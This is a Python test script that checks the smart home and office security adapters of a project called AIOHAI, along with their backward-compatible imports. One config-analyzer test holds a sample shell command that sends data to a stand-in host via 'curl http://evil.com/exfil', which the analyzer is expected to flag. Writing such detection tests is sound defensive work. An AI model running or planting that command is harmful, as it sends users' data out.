#!/usr/bin/env python3
"""AIOHAI Extraction Verification — Phase 4 (Integration Adapters)"""
import sys, os, tempfile
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

results = []
def test(name, fn):
    try:
        fn()
        results.append(('PASS', name))
        print(f'  PASS  {name}')
    except Exception as e:
        results.append(('FAIL', name, str(e)[:200]))
        print(f'  FAIL  {name}: {str(e)[:200]}')

print('=== Phase 4a: Smart Home ===')

def t():
    from aiohai.integrations.smart_home.stack_detector import SmartHomeStackDetector
    with tempfile.TemporaryDirectory() as td:
        det = SmartHomeStackDetector(base_dir=td)
        result = det.detect()
        assert result['deployment_state'] == 'not_deployed'
        ctx = det.get_context_block()
        assert '[SMART_HOME_STATUS]' in ctx
test('P4a_SmartHomeStackDetector', t)

def t():
    from aiohai.integrations.smart_home.config_analyzer import SmartHomeConfigAnalyzer
    analyzer = SmartHomeConfigAnalyzer()
    # Safe config
    findings = analyzer.analyze_config('light.kitchen:\n  platform: switch')
    assert len(findings) == 0
    # Dangerous config
    findings = analyzer.analyze_config('shell_command:\n  backup: curl http://evil.com/exfil')
    assert len(findings) > 0
    # Docker compose
    findings = analyzer.analyze_docker_compose(
        'services:\n  test:\n    image: ghcr.io/home-assistant/core:latest\n    privileged: true')
    assert any('privileged' in f.message for f in findings)
    # Risk scoring
    assert analyzer.get_risk_score() >= 0
test('P4a_SmartHomeConfigAnalyzer', t)

def t():
    from aiohai.integrations.smart_home.notification import HomeAssistantNotificationBridge
    bridge = HomeAssistantNotificationBridge()
    assert bridge.port == 11436
    assert bridge.notification_log == []
test('P4a_HomeAssistantNotificationBridge', t)

def t():
    from aiohai.integrations.smart_home.service_registry import LocalServiceRegistry
    assert LocalServiceRegistry is not None
test('P4a_LocalServiceRegistry_import', t)

def t():
    from aiohai.integrations.smart_home.query_executor import LocalAPIQueryExecutor
    assert LocalAPIQueryExecutor is not None
test('P4a_LocalAPIQueryExecutor_import', t)

def t():
    from aiohai.integrations.smart_home import (
        LocalServiceRegistry, LocalAPIQueryExecutor,
        SmartHomeConfigAnalyzer, SmartHomeStackDetector,
        HomeAssistantNotificationBridge
    )
test('P4a_package_imports', t)

# Backward compat
def t():
    from proxy.aiohai_proxy import LocalServiceRegistry as A
    from aiohai.integrations.smart_home.service_registry import LocalServiceRegistry as B
    assert A is B
    from proxy.aiohai_proxy import LocalAPIQueryExecutor as A
    from aiohai.integrations.smart_home.query_executor import LocalAPIQueryExecutor as B
    assert A is B
test('P4a_backward_compat_proxy', t)

def t():
    from security.security_components import SmartHomeStackDetector as A
    from aiohai.integrations.smart_home.stack_detector import SmartHomeStackDetector as B
    assert A is B
    from security.security_components import SmartHomeConfigAnalyzer as A
    from aiohai.integrations.smart_home.config_analyzer import SmartHomeConfigAnalyzer as B
    assert A is B
    from security.security_components import HomeAssistantNotificationBridge as A
    from aiohai.integrations.smart_home.notification import HomeAssistantNotificationBridge as B
    assert A is B
test('P4a_backward_compat_security', t)

print('\n=== Phase 4b: Office ===')

def t():
    from aiohai.integrations.office.document_scanner import DocumentContentScanner
    assert DocumentContentScanner is not None
test('P4b_DocumentContentScanner_import', t)

def t():
    from aiohai.integrations.office.macro_blocker import MacroBlocker
    assert MacroBlocker is not None
test('P4b_MacroBlocker_import', t)

def t():
    from aiohai.integrations.office.metadata_sanitizer import MetadataSanitizer
    assert MetadataSanitizer is not None
test('P4b_MetadataSanitizer_import', t)

def t():
    from aiohai.integrations.office.graph_registry import GraphAPIRegistry
    assert GraphAPIRegistry is not None
test('P4b_GraphAPIRegistry_import', t)

def t():
    from aiohai.integrations.office.stack_detector import OfficeStackDetector
    det = OfficeStackDetector(base_dir=tempfile.mkdtemp())
    result = det.detect()
    assert result['detection_state'] in ('not_available', 'partial', 'ready')
    ctx = det.get_context_block()
    assert '[OFFICE_STATUS]' in ctx
test('P4b_OfficeStackDetector', t)

def t():
    from aiohai.integrations.office.audit_logger import DocumentAuditLogger
    with tempfile.TemporaryDirectory() as td:
        logger = DocumentAuditLogger(log_dir=td)
        entry = logger.log_operation('CREATE', '/test/doc.docx', '.docx')
        assert entry['operation'] == 'CREATE'
        stats = logger.get_stats()
        assert stats['total_operations'] == 1
test('P4b_DocumentAuditLogger', t)

def t():
    from aiohai.integrations.office import (
        DocumentContentScanner, MacroBlocker, MetadataSanitizer,
        GraphAPIRegistry, OfficeStackDetector, DocumentAuditLogger
    )
test('P4b_package_imports', t)

# Backward compat
def t():
    from proxy.aiohai_proxy import DocumentContentScanner as A
    from aiohai.integrations.office.document_scanner import DocumentContentScanner as B
    assert A is B
    from proxy.aiohai_proxy import MacroBlocker as A
    from aiohai.integrations.office.macro_blocker import MacroBlocker as B
    assert A is B
    from proxy.aiohai_proxy import MetadataSanitizer as A
    from aiohai.integrations.office.metadata_sanitizer import MetadataSanitizer as B
    assert A is B
    from proxy.aiohai_proxy import GraphAPIRegistry as A
    from aiohai.integrations.office.graph_registry import GraphAPIRegistry as B
    assert A is B
test('P4b_backward_compat_proxy', t)

def t():
    from security.security_components import OfficeStackDetector as A
    from aiohai.integrations.office.stack_detector import OfficeStackDetector as B
    assert A is B
    from security.security_components import DocumentAuditLogger as A
    from aiohai.integrations.office.audit_logger import DocumentAuditLogger as B
    assert A is B
test('P4b_backward_compat_security', t)

print()
passed = sum(1 for r in results if r[0] == 'PASS')
failed = sum(1 for r in results if r[0] == 'FAIL')
print(f'=== TOTAL: {passed} passed, {failed} failed out of {len(results)} ===')
if failed:
    print('\nFailures:')
    for r in results:
        if r[0] == 'FAIL':
            print(f'  {r[1]}: {r[2]}')
    sys.exit(1)
